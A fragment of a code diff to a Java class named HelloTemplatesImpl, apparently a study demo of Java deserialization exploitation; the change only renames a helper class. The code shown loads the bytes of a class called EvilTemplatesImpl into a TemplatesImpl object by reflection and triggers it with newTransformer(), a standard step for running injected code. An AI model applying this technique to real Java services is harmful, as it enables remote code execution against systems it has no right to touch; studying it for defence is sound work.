@@ -22,14 +22,14 @@ public class HelloTemplatesImpl {
 
         // 2.defineTransletClasses() -> defineClass()
 
-        class A extends TransformerFactoryImpl {}
+        class TFactory extends TransformerFactoryImpl {}
 
         byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);
 
         TemplatesImpl templates = new TemplatesImpl();
         ReflectionUtil.setFieldValue(templates, "_name", "");
         ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{code});
-        ReflectionUtil.setFieldValue(templates, "_tfactory", new A());
+        ReflectionUtil.setFieldValue(templates, "_tfactory", new TFactory());
 
         templates.newTransformer();
     }
